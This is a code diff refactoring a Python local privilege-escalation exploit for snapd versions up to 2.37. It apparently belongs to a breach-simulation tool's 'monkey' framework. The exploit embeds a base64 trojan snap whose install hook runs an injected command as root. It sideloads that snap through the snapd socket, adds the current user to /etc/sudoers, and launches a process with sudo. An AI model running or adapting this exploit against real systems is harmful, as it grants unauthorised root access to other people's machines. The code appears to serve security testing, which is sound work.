@@ -4,7 +4,6 @@
     Vulnerable snapd versions <=2.37 and If your snapd version has a reference to something like an Ubuntu version number appended to it (example: 2.34.2ubuntu0.1 or 2.35.5+18.10.1) It is patched
 """
 import os
-import sys
 import time
 import base64
 import string
@@ -23,12 +22,12 @@ __author__ = "D3fa1t"
 APPEND_COMMENT = " #"
 SLEEP = 5   # in sec
 
-'''
+"""
 TROJAN_BASE_SNAP contains a simple snap application with an install hook which takes the cmd from the user 
 and if the exploit is successful, then the cmd is run as root 
 
 `BQUF` is a place holder which would later be replace by the cmd that needs to be run as root
-'''
+"""
 
 TROJAN_BASE_SNAP = ('''
 aHNxcwcAAACe5/ZcAAACAAEAAAABABEA6wEBAAQAAADYAAAAAAAAAEQHAAAAAAAAPAcAAAAAAAD/
@@ -46,6 +45,21 @@ AgAIAHNuYXAueWFtbAAAAAAAAAAAAwAAAAAAAAACAAYAaW5zdGFsbAAAAAAAAAAABgAAAJgAAAAB
 AAQAaG9va3MBAAAAAAAAAAEAAAB4AAAAAQADAG1ldGG4AAQAAQADAHNuYXAQgGAAAAAAAAAA4QQA
 AQAAAADaBgAAAAAAADiAeAAAAAAAAAA4AAAAAAAAAAAAAAAAAAAAWAAAAAAAAAC4AAAAAAAAAJgA
 AAAAAAAA2AAAAAAAAAD0BgAAAAAAAASA6AMAADYH'''+'A'*2990 + '==')
+
+
+def shell(cmd):
+    """
+    To run the command on the shell and to read the output.
+    :param cmd: The commands to be run on the shell
+    :return: returns the output
+    """
+    try:
+        result = os.popen(cmd).read()[:-1]
+        return result
+    except OSError as e:
+        LOG.error("Can't read from the shell!")
+        return False
+
 
 def create_sockfile():
     """
@@ -78,14 +92,11 @@ def bind_sock(sockfile):
         return False
 
     # Connect to the snap daemon
-    LOG.info("Connecting to snapd API...")
-
     try:
         client_sock.connect('/run/snapd.socket')
     except socket.error as e:
         LOG.error('Failed to connect to snapd.socket! The service snapd is not running')
         return False
-
 
     return client_sock
 
@@ -123,15 +134,15 @@ def delete_snap(client_sock):
 
     # We sleep to allow the API command to complete, otherwise the install
     # may fail.
-    return True
     time.sleep(SLEEP)
+    return True
 
 
-def install_snap(client_sock, TROJAN_SNAP):
+def install_snap(client_sock, trojan_snap):
     """Sideloads the trojan snap"""
 
     # Decode the base64 from above back into bytes
-    blob = base64.b64decode(TROJAN_SNAP)
+    blob = base64.b64decode(trojan_snap)
 
     # Configure the multi-part form upload boundary here:
     boundary = '------------------------f8c156143a1caf97'
@@ -193,13 +204,21 @@ Content-Type: application/octet-stream
     return True
 
 
-def runCommandAsRoot(command):
+def run_command_as_root(command):
+    """
+    This function takes in the command and runs them as root
+    if the pe is successful
+    :param command: Command to be run as root
+    :return: True if the Pe is successful
+    """
     global TROJAN_BASE_SNAP
     command = command + APPEND_COMMENT
     index = 108 + len(command)
-    TROJAN_BASE_SNAP_DECODE = TROJAN_BASE_SNAP.decode('base64')
-    TROJAN_SNAP = base64.b64encode("".join(
-        (TROJAN_BASE_SNAP_DECODE[:108], command, TROJAN_BASE_SNAP_DECODE[index:])))
+    trojan_base_snap_decode = TROJAN_BASE_SNAP.decode('base64')
+
+    # Create a snap application with out command as the install hook
+    trojan_snap = base64.b64encode("".join(
+        (trojan_base_snap_decode[:108], command, trojan_base_snap_decode[index:])))
 
     # Create a random name for the dirty socket file
     sockfile = create_sockfile()
@@ -214,7 +233,7 @@ def runCommandAsRoot(command):
         return False
 
     # Install the trojan snap, which has an install hook that creates a user
-    if not install_snap(client_sock, TROJAN_SNAP):
+    if not install_snap(client_sock, trojan_snap):
         return False
 
     # Delete the trojan snap
@@ -225,31 +244,44 @@ def runCommandAsRoot(command):
     return True
 
 
-class snapdExploiter(HostPrivExploiter):
-    def try_priv_esc(self,command):
-        '''
-        This function tries pe and if succeeds then we run the command 
-        '''
-        runMonkey = command
+class SnapdExploiter(HostPrivExploiter):
+    def __init__(self):
+        self.file_path = ""
+
+    @staticmethod
+    def try_priv_esc(self, command_line):
+        """
+        The function takes in the command line to run the monkey as an argument
+        and tries to run the monkey as a root user.
+        :param command_line: The command line to run the monkey in the format {dest_path  MONKEY_ARG  monkey_options}
+        :return: True if the pe is successful
+        """
+        self.file_path = command_line.split(' ')[0]
+
         # get the current user name
-        whoami = os.popen('whoami').read()[:-1]
-        LOG.info("Adding the current user %s to the sudoers list",whoami)
+        whoami = shell("whoami")
+
+        # Error reading off shell
+        if not whoami:
+            return False
+        LOG.info("Adding the current user %s to the sudoers list", whoami)
 
         # we create a temp file in /tmp as root to verify command exec as root
         alphabet = string.ascii_lowercase
         filename = ''.join(random.choice(alphabet) for _ in range(10))
         operation = 'touch /tmp/'
-        # add the user to the sudo group
-        AddUserAsSudoers = ADDUSER_TO_SUDOERS % {'user_name' : whoami}
-        command = AddUserAsSudoers
 
-        if runCommandAsRoot(command):
-            # check if exploit is successful
+        # add the user to the sudo group
+        add_user_to_sudoers = ADDUSER_TO_SUDOERS % {'user_name': whoami}
+
+        if run_command_as_root(add_user_to_sudoers):
+
+            # check if exploit is successful by touching a file and checking the owner
             file_path = "/tmp/%(filename)s"
             touch_file = "sudo " + operation + filename
-            os.popen(touch_file).read()[:-1]
+            shell(touch_file)
             LOG.info("Touching the file %s" % touch_file)
-            time.sleep(1) # sleep untill the file is created
+            time.sleep(1)  # sleep un-till the file is created
             if not check_if_sudoer(file_path %{'filename':filename}):
                 LOG.info("Either file doesn't exist or is not owned by root!")
                 return False
@@ -257,22 +289,21 @@ class snapdExploiter(HostPrivExploiter):
             LOG.info("Snapd Privilege escalation was not successful!")
             return False
 
-        LOG.info("The command that is executed as root is %s" % command)
+        LOG.info("The command that is executed as root is %s" % add_user_to_sudoers)
         # now run the monkey as root
 
-        command = "sudo " + runMonkey
-        monkey_process = subprocess.Popen(command, shell=True,
+        command_line = "sudo " + command_line
+        monkey_process = subprocess.Popen(command_line, shell=True,
                                           stdin=None, stdout=None, stderr=None,
                                           close_fds=True, creationflags=0)
 
         LOG.info("Executed monkey process as root with (PID=%d) with command line: %s",
-                 monkey_process.pid, command)
+                 monkey_process.pid, command_line)
 
         # now remove the user from sudoers
         LOG.info("Removing the current user %s from the sudoers list", whoami)
 
-        removeFromSudoers = REMOVE_LASTLINE % {'file_name' : "/etc/sudoers"}
-        monkey_process = subprocess.Popen(removeFromSudoers, shell=True,
-                                          stdin=None, stdout=None, stderr=None,
-                                          close_fds=True, creationflags=0)
+        remove_from_sudoers = REMOVE_LASTLINE % {'file_name' : "/etc/sudoers"}
+        subprocess.Popen(remove_from_sudoers, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True,
+                         creationflags=0)
         return True
